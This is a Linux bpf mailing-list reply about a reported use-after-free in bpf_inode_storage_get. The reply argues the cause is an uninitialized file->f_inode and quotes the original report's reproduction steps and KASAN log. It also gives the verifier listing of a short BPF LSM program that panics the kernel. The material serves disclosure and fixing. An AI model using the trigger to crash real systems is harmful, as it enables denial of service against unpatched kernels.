Return-Path: <bpf+bounces-75505-lists+bpf=lfdr.de@vger.kernel.org>
X-Original-To: lists+bpf@lfdr.de
Delivered-To: lists+bpf@lfdr.de
Received: from dfw.mirrors.kernel.org (dfw.mirrors.kernel.org [142.0.200.124])
	by mail.lfdr.de (Postfix) with ESMTPS id E651BC876AC
	for <lists+bpf@lfdr.de>; Wed, 26 Nov 2025 00:06:11 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by dfw.mirrors.kernel.org (Postfix) with ESMTPS id 7A0574E1178
	for <lists+bpf@lfdr.de>; Tue, 25 Nov 2025 23:06:10 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 57B2F253944;
	Tue, 25 Nov 2025 23:06:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="VbtOJ2KC"
X-Original-To: bpf@vger.kernel.org
Received: from mail-yx1-f53.google.com (mail-yx1-f53.google.com [74.125.224.53])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5717A1096F
	for <bpf@vger.kernel.org>; Tue, 25 Nov 2025 23:06:02 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.224.53
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1764111964; cv=none; b=N92G+tCo46rfL1aPrAwNZdUja37bSMcX2wZgh8wmgsJBTxGxkgveRcmjwLyao4WxUawmkrVwMHGpnylAuHTYP7bjsHklnggfDKkyiL3d74N5aXNlzNbGSbkv55dV3JVZ1Puq/RE+iWdFvwYsiizHFBpD736VOLpcLnl2T428+yw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1764111964; c=relaxed/simple;
	bh=huwZwuwxsFmP0P23BVHawhpr97HhXqUy9NWMHhLN9XA=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=lhTnUDIFub7d6pHVOjM4NpR9Iy/TFnCMw6PlpPxSRGxTYvjVlsLTqFJkFs18+G/+uUcZArctU73YEIXOblrTw2EOOp4VDlO9ArhTnWY9Cmri9WJKTD2Ze81TicV+qUOdGSe+6J51KjvhptsxsM5oIn48BF4sYfEZjMPcixBy/3g=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=VbtOJ2KC; arc=none smtp.client-ip=74.125.224.53
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Received: by mail-yx1-f53.google.com with SMTP id 956f58d0204a3-640c9c85255so8612939d50.3
        for <bpf@vger.kernel.org>; Tue, 25 Nov 2025 15:06:02 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1764111961; x=1764716761; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=8jbqWiIFxTK8ZuSyZg6BeIZI1HSDfT+uIyr5qxOXSo0=;
        b=VbtOJ2KC2iX8pULB5UVwSzPuYLzAmg576LGqpTY6KW1rM+nJKkq33p9riTtJCitGNj
         JpifzF4ittNVgYlK5ofU5GeqUy6B3qwCGvqH2HrgU8wsD1PYULT5ViNlG5WjsAtMCT5Z
         VdD7LrRzcMrMDoBF9znVLkK6+WqbOegPqcwRKfQBXAKfFhOOr4ijDQDA0CFA1TdvTv/U
         oJdDPZ8wJpnH5GAPgMPXgAz/6yJTbTVaxN8nHlJ8KbCIFovbORX9kzBr3PtG1M8gC4vJ
         LZpuXnKExhNncbXMaP7l5nXM5uwbiz/HDr076usC5deeHD/qHoQz0GuC2RQfBJ7XfyMP
         PvcA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1764111961; x=1764716761;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=8jbqWiIFxTK8ZuSyZg6BeIZI1HSDfT+uIyr5qxOXSo0=;
        b=owpCyXj1mtK3d5jZXU8qL6b58R6GU458m/ill8OVv7VHIrceOZ3nR83w3duRt72lfk
         u+ikRfQhO906c+4uspd7CaRj529EF8aI8jEZIjBiATkdEzCDu4+ZeCyLOI2WZ8dqRywb
         tXkPvhGlpfwApdAccsyvu2IurEV+xgnT36L0QVwYTHpPzYiRUwgjOeZ+kDGnOhwtvWAp
         Gyq3w36quVYJ/cEC0NVvPDZ23cBFhPbFfvDVuNFX/OypDTfMQMf6sRK36Zt8QLlxI3xC
         8bEe7lQGoHdyonmS0SsZqPuztEJZmwPcfQD30OmaW0ZVrOTCXOGFpvpW/QetHnaNa5gL
         53SQ==
X-Gm-Message-State: AOJu0YxP9TsGO1u5wH8Q4vvgWffylU6ahZu2SGCXIHfo+YnWrEB6WQ5U
	L+Njjk7KtHN/gP2lwm4O9N2fJjLtt7OaeCpOegWg4PrCJu3dNlXyTftBtmclj6MIfouCsCLtDpN
	SHMDxKEtxHGgo/HeNTeZCCc640TMO2zhyY1aL
X-Gm-Gg: ASbGncty23hv/4aFkJjUmVhOLJQ43Ys3hylsa5moKLcDcroBUAGTPnDIAgKj89qyIBJ
	/omDr3yUg/G48j3OqiJNSkHj3Hm1hh+dnSUIWYkGRTr5eVDijvARlMlLcx/glYqbpeIR8jG37sI
	xX9PkLPSLg1Cx6O6Q4ORpgod7MjrCHfTJ125YKhCRN37lx4sdntlKiyzKMLV+K644Y+Y9gKBAQ0
	OOFWGaY4/prgTmqtgSnX46eemgpJb1BhUntXtTsTWBt6Iz4pHrsHekbjRUnlOv5/DP9NNo=
X-Google-Smtp-Source: AGHT+IH+bgbdXFEsijwzncKLuQ1cy1/vD/lVGIKd2T1vqmLBzoG6kuhoPjTA+no+vTbmRGuRWQVsj93n50ytGY12LXk=
X-Received: by 2002:a05:690e:1288:b0:643:833:bf3 with SMTP id
 956f58d0204a3-6432939a019mr3174918d50.42.1764111961028; Tue, 25 Nov 2025
 15:06:01 -0800 (PST)
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <1d2d1968.47cd3.19ab9528e94.Coremail.kaiyanm@hust.edu.cn>
In-Reply-To: <1d2d1968.47cd3.19ab9528e94.Coremail.kaiyanm@hust.edu.cn>
From: Amery Hung <ameryhung@gmail.com>
Date: Tue, 25 Nov 2025 15:05:49 -0800
X-Gm-Features: AWmQ_bl2Ht-hKx8BWUFBOPoNUfbvBR2yCsc1fr_hTTovgHAqeQpoDVCsWj5nZmI
Message-ID: <CAMB2axMgCapnYS4Qr-PVm6FjPCkF3bi-LNtV5EpFLVtAs_JNGA@mail.gmail.com>
Subject: Re: bpf: Race condition in inode local storage leads to use-after-free
To: =?UTF-8?B?5qKF5byA5b2m?= <kaiyanm@hust.edu.cn>
Cc: bpf@vger.kernel.org, daniel@iogearbox.net, dddddd@hust.edu.cn, 
	dzm91@hust.edu.cn, hust-os-kernel-patches@googlegroups.com, 
	martin.lau@linux.dev
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Mon, Nov 24, 2025 at 8:43=E2=80=AFPM =E6=A2=85=E5=BC=80=E5=BD=A6 <kaiyan=
m@hust.edu.cn> wrote:
>
> A use-after-free vulnerability was discovered in the `bpf_inode_storage_g=
et` helper function. This flaw is caused by a race condition between the de=
struction of the anonymous inode that backs the map of type `BPF_MAP_TYPE_I=
NODE_STORAGE` and the execution of a BPF program that attempts to access th=
at inode.
>
> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
>
> ## Root Cause
>
> The use-after-free occurs due to improper lifecycle management of the ano=
nymous inode associated with a `BPF_MAP_TYPE_INODE_STORAGE` map. The proble=
m could be triggered through a race condition:
>
> 1.  A BPF program creates a map of type `BPF_MAP_TYPE_INODE_STORAGE`. The=
 kernel allocates a file descriptor and an associated anonymous `inode` to =
serve as the backing storage.
> 2.  A BPF LSM program is loaded and attached to an LSM hook `bpf_lsm_file=
_alloc_security`. This program holds a reference to the `inode_storage` map=
.
> 3.  The process that created the map exits, causing the kernel to close i=
ts file descriptor. This decrements the reference count on the `inode`. Whe=
n the reference count drops to zero, the `inode` is freed.
> 4.  When another process trys to create the map, the LSM hook is triggere=
d, causing the attached BPF program to execute.
> 5.  The BPF program calls `bpf_inode_storage_get()`, passing a pointer to=
 the now-freed `inode`. The function attempts to access fields within this =
freed memory region, leading to a use-after-free.
>
> The fundamental problem is that the BPF program's reference to the `bpf_m=
ap` does not translate to a reference on the underlying `inode`. This allow=
s the `inode` to be destroyed while it is still potentially in use by an ac=
tive BPF program. The comment in the `bpf_inode_storage_get` function, `/* =
This helper must only called from where the inode is guaranteed to have a r=
efcount and cannot be freed. */`, highlights this exact requirement, which =
is violated by the race condition.

Thanks for reporting. I found the root cause here a bit hard to
follow, so I also ran your POC on a VM with bpf-next kernel and
confirmed the kernel did panic.

However, the bug seems to me to be an uninitialized file->f_inode
being passed to bpf_inode_storage_get() in
bpf_lsm_file_alloc_security.

alloc_file()
-> alloc_empty_file() first allocates a file struct using kmem_cache_alloc(=
)
-> init_file()
   -> security_file_alloc() // calling bpf_inode_storage_get() on
invalid file->f_inode
   -> f->f_inode =3D NULL;
-> file_init_path()
   -> file->f_inode =3D path->dentry->d_inode

After moving f->f_inode before security_file_alloc(), the POC no
longer crash the kernel.

Attaching a more readable version of the BPF program and the splat I
got and the end for anyone interested.

0: R1=3Dctx() R10=3Dfp0
0: (79) r1 =3D *(u64 *)(r1 +0)
func 'bpf_lsm_file_alloc_security' arg0 has btf_id 254 type STRUCT 'file'
1: R1=3Dptr_file()
1: (79) r6 =3D *(u64 *)(r1 +96)         ; R1=3Dptr_file() R6=3Dptr_inode()
2: (18) r1 =3D 0xffff88810b54a400       ; R1=3Dmap_ptr(ks=3D4,vs=3D4)
4: (bf) r2 =3D r6                       ; R2=3Dptr_inode() R6=3Dptr_inode()
5: (b7) r3 =3D 0                        ; R3=3D0
6: (b7) r4 =3D 1                        ; R4=3D1
7: (85) call bpf_inode_storage_get#145        ;
R0=3Dmap_value_or_null(id=3D1,ks=3D4,vs=3D4)
8: (b7) r0 =3D 0                        ; R0=3D0
9: (95) exit

[   20.317017] Oops: general protection fault, probably for
non-canonical address 0x79726f6d656d75: 0000 [#1] SMP PTI
[   20.317857] CPU: 9 UID: 0 PID: 803 Comm: ls_inode Tainted: G
    E       6.18.0-rc5-g4617b3069af4-dirty #548 PREEMPT
[   20.318725] Tainted: [E]=3DUNSIGNED_MODULE
[   20.319029] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996),
BIOS 1.16.3-4.el9 04/01/2014
[   20.319762] RIP: 0010:bpf_inode_storage_get+0x5d/0xf0
[   20.320229] Code: 79 32 14 01 85 c0 75 0d e8 40 19 e9 ff 85 c0 0f
84 97 00 00 00 49 83 fd 02 0f 93 c0 4d 85 e4 0f 94 c1 08 c1 74 041
[   20.321843] RSP: 0018:ffffc900015c7b98 EFLAGS: 00010246
[   20.322243] RAX: 0000000000000000 RBX: 0000000000000820 RCX: 349d2ea07cf=
7b200
[   20.322797] RDX: 0000000000000000 RSI: ffffffff8419c980 RDI: ffff88810f5=
58bc0
[   20.323353] RBP: ffffc900015c7bd0 R08: 0000000000000820 R09: fffffffffff=
fffff
[   20.323856] R10: 0000800000a00000 R11: ffff88810ffa3c60 R12: 0079726f6d6=
56d3d
[   20.324402] R13: 0000000000000001 R14: 0000000000000000 R15: ffff888110d=
8a800
[   20.324907] FS:  00007fc500c01680(0000) GS:ffff88889aeb1000(0000)
knlGS:0000000000000000
[   20.325533] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   20.325967] CR2: 00007fc500ac1d80 CR3: 000000011448c003 CR4: 00000000007=
72ef0
[   20.326531] PKRU: 55555554
[   20.326744] Call Trace:
[   20.326938]  <TASK>
[   20.327114]  bpf_prog_7fbc899361679885+0x5b/0x64
[   20.327498]  bpf_trampoline_6442529490+0x58/0xed
[   20.327846]  security_file_alloc+0x68/0xa0
[   20.328165]  init_file+0x2e/0x150
[   20.328446]  alloc_empty_file+0x51/0x120
[   20.328746]  path_openat+0x4c/0xe80
[   20.329025]  ? fs_reclaim_acquire+0x5d/0xc0
[   20.329379]  do_filp_open+0xb6/0x160
[   20.329650]  ? lock_acquire+0xd4/0x260
[   20.329951]  ? alloc_fd+0x3c/0x1f0
[   20.330222]  ? alloc_fd+0x1ce/0x1f0
[   20.330540]  ? _raw_spin_unlock+0x1f/0x40
[   20.330846]  do_sys_openat2+0x70/0xd0
[   20.331151]  ? entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   20.331571]  __x64_sys_openat+0x7c/0xa0
[   20.331855]  do_syscall_64+0x86/0x6f0
[   20.332128]  ? clear_bhb_loop+0x60/0xb0
[   20.332438]  entry_SYSCALL_64_after_hwframe+0x76/0x7e

>
>
> ## Reproduction Steps
>
> 1.  **Map Creation**: Create a BPF map of type `BPF_MAP_TYPE_INODE_STORAG=
E`. This returns a file descriptor for the map, which is backed by an anony=
mous inode.
> 2.  **Program Setup**: Load a `BPF_PROG_TYPE_LSM` BPF program. The progra=
m should be written to call the `bpf_inode_storage_get()` helper, using the=
 file descriptor of the map created in the previous step.
> 3.  **Link Creation**: Attach the LSM program to  `bpf_lsm_file_alloc_sec=
urity`.
> 4.  **Trigger**: Exit the process that created the map. This implicitly c=
loses the map's file descriptor, causing the backing `inode` to be freed. C=
oncurrently, trigger the LSM hook (e.g., by creating a file in another proc=
ess). The BPF program will execute and attempt to access the freed inode vi=
a `bpf_inode_storage_get()`, triggering the KASAN crash.
>
> ## Recommended Fix
>
> The BPF subsystem should ensure that the `inode` associated with an `inod=
e_storage` map remains valid as long as a BPF program holding a reference t=
o that map is loaded. A potential fix is to increment the `inode`'s referen=
ce count (`i_count`) when a BPF program using it is loaded (e.g., during `b=
pf_map_get()`) and decrement the count when the program is unloaded. This w=
ould prevent the `inode` from being prematurely freed while still in use by=
 an attached BPF program.
>
> ## KASAN Report
>
> ```
> [   57.905993][ T9899] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> [   57.906324][ T9899] BUG: KASAN: slab-use-after-free in bpf_inode_stora=
ge_get+0x1db/0x200
> [   57.906657][ T9899] Read of size 8 at addr ffff888109b8a300 by task po=
c/9899
> [   57.906952][ T9899]
> [   57.907053][ T9899] CPU: 0 UID: 0 PID: 9899 Comm: poc Not tainted 6.18=
.0-rc5-next-20251111 #6 PREEMPT(full)
> [   57.907064][ T9899] Hardware name: QEMU Standard PC (i440FX + PIIX, 19=
96), BIOS 1.15.0-1 04/01/2014
> [   57.907068][ T9899] Call Trace:
> [   57.907070][ T9899]  <TASK>
> [   57.907072][ T9899]  dump_stack_lvl+0x116/0x1b0
> [   57.907080][ T9899]  print_report+0xca/0x5f0
> [   57.907088][ T9899]  ? __phys_addr+0xf0/0x180
> [   57.907097][ T9899]  ? bpf_inode_storage_get+0x1db/0x200
> [   57.907104][ T9899]  ? bpf_inode_storage_get+0x1db/0x200
> [   57.907111][ T9899]  kasan_report+0xca/0x100
> [   57.907119][ T9899]  ? bpf_inode_storage_get+0x1db/0x200
> [   57.907128][ T9899]  bpf_inode_storage_get+0x1db/0x200
> [   57.907136][ T9899]  bpf_prog_7fbc899361679885+0x63/0x6c
> [   57.907141][ T9899]  bpf_trampoline_6442648864+0x58/0x141
> [   57.907148][ T9899]  bpf_lsm_file_alloc_security+0x9/0x20
> [   57.907157][ T9899]  security_file_alloc+0x146/0x2d0
> [   57.907164][ T9899]  init_file+0x9a/0x4d0
> [   57.907172][ T9899]  alloc_empty_file+0x78/0x1e0
> [   57.907179][ T9899]  alloc_file_pseudo+0x130/0x220
> [   57.907187][ T9899]  ? __pfx_alloc_file_pseudo+0x10/0x10
> [   57.907194][ T9899]  ? _raw_spin_unlock+0x2d/0x50
> [   57.907201][ T9899]  ? alloc_fd+0x3c2/0x780
> [   57.907211][ T9899]  __anon_inode_getfile+0xed/0x290
> [   57.907220][ T9899]  anon_inode_getfd+0x5b/0xb0
> [   57.907228][ T9899]  map_create+0x1568/0x2720
> [   57.907239][ T9899]  ? __pfx_map_create+0x10/0x10
> [   57.907248][ T9899]  ? __might_fault+0xe5/0x190
> [   57.907260][ T9899]  __sys_bpf+0x195f/0x5470
> [   57.907269][ T9899]  ? __pfx___sys_bpf+0x10/0x10
> [   57.907278][ T9899]  ? __handle_mm_fault+0x51c/0x2b80
> [   57.907288][ T9899]  ? __lock_acquire+0x633/0x1be0
> [   57.907296][ T9899]  ? css_rstat_updated+0x1c7/0x520
> [   57.907304][ T9899]  ? __pfx_css_rstat_updated+0x10/0x10
> [   57.907317][ T9899]  ? exc_page_fault+0xc2/0x1a0
> [   57.907327][ T9899]  __x64_sys_bpf+0x7d/0xc0
> [   57.907335][ T9899]  ? lockdep_hardirqs_on+0x7c/0x110
> [   57.907342][ T9899]  do_syscall_64+0xcb/0xfa0
> [   57.907349][ T9899]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   57.907355][ T9899] RIP: 0033:0x7f438e8a17d9
> [   57.907360][ T9899] Code: 08 89 e8 5b 5d c3 66 2e 0f 1f 84 00 00 00 00=
 00 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c28
> [   57.907367][ T9899] RSP: 002b:00007ffc9ccc1e48 EFLAGS: 00000206 ORIG_R=
AX: 0000000000000141
> [   57.907373][ T9899] RAX: ffffffffffffffda RBX: 00007ffc9ccc20c8 RCX: 0=
0007f438e8a17d9
> [   57.907377][ T9899] RDX: 0000000000000040 RSI: 00007ffc9ccc1e70 RDI: 0=
000000000000000
> [   57.907380][ T9899] RBP: 00007ffc9ccc1f00 R08: 0000000000000003 R09: 0=
000000000000000
> [   57.907384][ T9899] R10: 0000000000000201 R11: 0000000000000206 R12: 0=
000000000000000
> [   57.907387][ T9899] R13: 00007ffc9ccc20d8 R14: 0000556796cb4dd8 R15: 0=
0007f438e9c2020
> [   57.907396][ T9899]  </TASK>
> [   57.907398][ T9899]
> [   57.918793][ T9899] Allocated by task 1:
> [   57.918993][ T9899]  kasan_save_stack+0x24/0x50
> [   57.919221][ T9899]  kasan_save_track+0x14/0x30
> [   57.919448][ T9899]  __kasan_slab_alloc+0x87/0x90
> [   57.919691][ T9899]  kmem_cache_alloc_lru_noprof+0x294/0x7c0
> [   57.919988][ T9899]  alloc_inode+0x187/0x250
> [   57.920209][ T9899]  create_pipe_files+0x51/0x9d0
> [   57.920448][ T9899]  do_pipe2+0x9c/0x1c0
> [   57.920652][ T9899]  __x64_sys_pipe2+0x59/0x80
> [   57.920883][ T9899]  do_syscall_64+0xcb/0xfa0
> [   57.921107][ T9899]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   57.921395][ T9899]
> [   57.921510][ T9899] Freed by task 9823:
> [   57.921708][ T9899]  kasan_save_stack+0x24/0x50
> [   57.921946][ T9899]  kasan_save_track+0x14/0x30
> [   57.922176][ T9899]  kasan_save_free_info+0x3b/0x60
> [   57.922421][ T9899]  __kasan_slab_free+0x61/0x80
> [   57.922661][ T9899]  kmem_cache_free+0x167/0x680
> [   57.922893][ T9899]  destroy_inode+0xcc/0x1b0
> [   57.923115][ T9899]  evict+0x579/0xa90
> [   57.923308][ T9899]  iput.part.0+0x7f9/0xf40
> [   57.923530][ T9899]  iput+0x3a/0x40
> [   57.923716][ T9899]  dentry_unlink_inode+0x29b/0x480
> [   57.923971][ T9899]  __dentry_kill+0x1d7/0x600
> [   57.924199][ T9899]  dput.part.0+0x4b5/0x9b0
> [   57.924423][ T9899]  dput+0x24/0x30
> [   57.924601][ T9899]  __fput+0x51b/0xb50
> [   57.924801][ T9899]  fput_close_sync+0x114/0x210
> [   57.925040][ T9899]  __x64_sys_close+0x93/0x120
> [   57.925281][ T9899]  do_syscall_64+0xcb/0xfa0
> [   57.925501][ T9899]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   57.925792][ T9899]
> [   57.925906][ T9899] The buggy address belongs to the object at ffff888=
109b8a2c8
> [   57.925906][ T9899]  which belongs to the cache inode_cache of size 11=
44
> [   57.926566][ T9899] The buggy address is located 56 bytes inside of
> [   57.926566][ T9899]  freed 1144-byte region [ffff888109b8a2c8, ffff888=
109b8a740)
> [   57.927222][ T9899]
> [   57.927337][ T9899] The buggy address belongs to the physical page:
> [   57.927641][ T9899] page: refcount:0 mapcount:0 mapping:00000000000000=
00 index:0xffff888109b8a2c8 pfn:0x109b88
> [   57.928128][ T9899] head: order:3 mapcount:0 entire_mapcount:0 nr_page=
s_mapped:0 pincount:0
> [   57.928533][ T9899] memcg:ffff8881000ac801
> [   57.928737][ T9899] anon flags: 0x57ff00000000040(head|node=3D1|zone=
=3D2|lastcpupid=3D0x7ff)
> [   57.929126][ T9899] page_type: f5(slab)
> [   57.929321][ T9899] raw: 057ff00000000040 ffff888100050b40 00000000000=
00000 0000000000000001
> [   57.929729][ T9899] raw: ffff888109b8a2c8 0000000000190017 00000000f50=
00000 ffff8881000ac801
> [   57.930084][ T9899] head: 057ff00000000040 ffff888100050b40 0000000000=
000000 0000000000000001
> [   57.930430][ T9899] head: ffff888109b8a2c8 0000000000190017 00000000f5=
000000 ffff8881000ac801
> [   57.930776][ T9899] head: 057ff00000000003 ffffea000426e201 00000000ff=
ffffff 00000000ffffffff
> [   57.931125][ T9899] head: ffffffffffffffff 0000000000000000 00000000ff=
ffffff 0000000000000008
> [   57.931468][ T9899] page dumped because: kasan: bad access detected
> [   57.931723][ T9899] page_owner tracks the page as allocated
> [   57.931953][ T9899] page last allocated via order 3, migratetype Recla=
imable, gfp_mask 0xd20d0(__GFP_RECLAIMABLE|__GFP_IO0
> [   57.932835][ T9899]  post_alloc_hook+0x1be/0x230
> [   57.933037][ T9899]  get_page_from_freelist+0x111c/0x3030
> [   57.933266][ T9899]  __alloc_frozen_pages_noprof+0x25b/0x2130
> [   57.933508][ T9899]  alloc_pages_mpol+0x1f6/0x550
> [   57.933709][ T9899]  new_slab+0x256/0x370
> [   57.933884][ T9899]  ___slab_alloc+0xc00/0x1710
> [   57.934077][ T9899]  __slab_alloc.constprop.0+0x6b/0x120
> [   57.934301][ T9899]  kmem_cache_alloc_lru_noprof+0x514/0x7c0
> [   57.934540][ T9899]  alloc_inode+0x187/0x250
> [   57.934722][ T9899]  iget_locked+0x1a4/0x6c0
> [   57.934909][ T9899]  kernfs_get_inode+0x4b/0x470
> [   57.935113][ T9899]  kernfs_iop_lookup+0x1a8/0x2e0
> [   57.935350][ T9899]  __lookup_slow+0x256/0x480
> [   57.935574][ T9899]  walk_component+0x34e/0x5b0
> [   57.935806][ T9899]  path_lookupat+0x148/0x6c0
> [   57.936043][ T9899]  filename_lookup+0x218/0x5f0
> [   57.936276][ T9899] page_owner free stack trace missing
> [   57.936533][ T9899]
> [   57.936650][ T9899] Memory state around the buggy address:
> [   57.936923][ T9899]  ffff888109b8a200: fb fb fb fb fb fb fb fb fb fc f=
c fc fc fc fc fc
> [   57.937312][ T9899]  ffff888109b8a280: fc fc fc fc fc fc fc fc fc fa f=
b fb fb fb fb fb
> [   57.937698][ T9899] >ffff888109b8a300: fb fb fb fb fb fb fb fb fb fb f=
b fb fb fb fb fb
> [   57.938084][ T9899]                    ^
> [   57.938286][ T9899]  ffff888109b8a380: fb fb fb fb fb fb fb fb fb fb f=
b fb fb fb fb fb
> [   57.938672][ T9899]  ffff888109b8a400: fb fb fb fb fb fb fb fb fb fb f=
b fb fb fb fb fb
> [   57.939056][ T9899] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> [   57.939644][ T9899] Kernel panic - not syncing: KASAN: panic_on_warn s=
et ...
> [   57.939995][ T9899] CPU: 0 UID: 0 PID: 9899 Comm: poc Not tainted 6.18=
.0-rc5-next-20251111 #6 PREEMPT(full)
> [   57.940473][ T9899] Hardware name: QEMU Standard PC (i440FX + PIIX, 19=
96), BIOS 1.15.0-1 04/01/2014
> [   57.940912][ T9899] Call Trace:
> [   57.941075][ T9899]  <TASK>
> [   57.941217][ T9899]  dump_stack_lvl+0x3d/0x1b0
> [   57.941438][ T9899]  vpanic+0x67e/0x710
> [   57.941640][ T9899]  panic+0xc7/0xd0
> [   57.941825][ T9899]  ? __pfx_panic+0x10/0x10
> [   57.942056][ T9899]  ? preempt_schedule_common+0x44/0xb0
> [   57.942329][ T9899]  ? bpf_inode_storage_get+0x1db/0x200
> [   57.942602][ T9899]  ? preempt_schedule_thunk+0x16/0x30
> [   57.942875][ T9899]  ? check_panic_on_warn+0x24/0xc0
> [   57.943134][ T9899]  ? bpf_inode_storage_get+0x1db/0x200
> [   57.943407][ T9899]  check_panic_on_warn+0xb6/0xc0
> [   57.943652][ T9899]  ? bpf_inode_storage_get+0x1db/0x200
> [   57.943920][ T9899]  end_report+0x107/0x170
> [   57.944140][ T9899]  kasan_report+0xd8/0x100
> [   57.944366][ T9899]  ? bpf_inode_storage_get+0x1db/0x200
> [   57.944633][ T9899]  bpf_inode_storage_get+0x1db/0x200
> [   57.944895][ T9899]  bpf_prog_7fbc899361679885+0x63/0x6c
> [   57.945160][ T9899]  bpf_trampoline_6442648864+0x58/0x141
> [   57.945424][ T9899]  bpf_lsm_file_alloc_security+0x9/0x20
> [   57.945693][ T9899]  security_file_alloc+0x146/0x2d0
> [   57.945948][ T9899]  init_file+0x9a/0x4d0
> [   57.946155][ T9899]  alloc_empty_file+0x78/0x1e0
> [   57.946393][ T9899]  alloc_file_pseudo+0x130/0x220
> [   57.946642][ T9899]  ? __pfx_alloc_file_pseudo+0x10/0x10
> [   57.946912][ T9899]  ? _raw_spin_unlock+0x2d/0x50
> [   57.947145][ T9899]  ? alloc_fd+0x3c2/0x780
> [   57.947358][ T9899]  __anon_inode_getfile+0xed/0x290
> [   57.947609][ T9899]  anon_inode_getfd+0x5b/0xb0
> [   57.947837][ T9899]  map_create+0x1568/0x2720
> [   57.948065][ T9899]  ? __pfx_map_create+0x10/0x10
> [   57.948306][ T9899]  ? __might_fault+0xe5/0x190
> [   57.948539][ T9899]  __sys_bpf+0x195f/0x5470
> [   57.948765][ T9899]  ? __pfx___sys_bpf+0x10/0x10
> [   57.949007][ T9899]  ? __handle_mm_fault+0x51c/0x2b80
> [   57.949275][ T9899]  ? __lock_acquire+0x633/0x1be0
> [   57.949521][ T9899]  ? css_rstat_updated+0x1c7/0x520
> [   57.949761][ T9899]  ? __pfx_css_rstat_updated+0x10/0x10
> [   57.949994][ T9899]  ? exc_page_fault+0xc2/0x1a0
> [   57.950194][ T9899]  __x64_sys_bpf+0x7d/0xc0
> [   57.950381][ T9899]  ? lockdep_hardirqs_on+0x7c/0x110
> [   57.950594][ T9899]  do_syscall_64+0xcb/0xfa0
> [   57.950782][ T9899]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [   57.951024][ T9899] RIP: 0033:0x7f438e8a17d9
> [   57.951208][ T9899] Code: 08 89 e8 5b 5d c3 66 2e 0f 1f 84 00 00 00 00=
 00 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c28
> [   57.951976][ T9899] RSP: 002b:00007ffc9ccc1e48 EFLAGS: 00000206 ORIG_R=
AX: 0000000000000141
> [   57.952312][ T9899] RAX: ffffffffffffffda RBX: 00007ffc9ccc20c8 RCX: 0=
0007f438e8a17d9
> [   57.952628][ T9899] RDX: 0000000000000040 RSI: 00007ffc9ccc1e70 RDI: 0=
000000000000000
> [   57.952947][ T9899] RBP: 00007ffc9ccc1f00 R08: 0000000000000003 R09: 0=
000000000000000
> [   57.953263][ T9899] R10: 0000000000000201 R11: 0000000000000206 R12: 0=
000000000000000
> [   57.953580][ T9899] R13: 00007ffc9ccc20d8 R14: 0000556796cb4dd8 R15: 0=
0007f438e9c2020
> [   57.953905][ T9899]  </TASK>
> [   57.954362][ T9899] Kernel Offset: disabled
> ```
>
> ## Proof of Concept
>
> The following C program can demonstrate the vulnerability on linux-next-2=
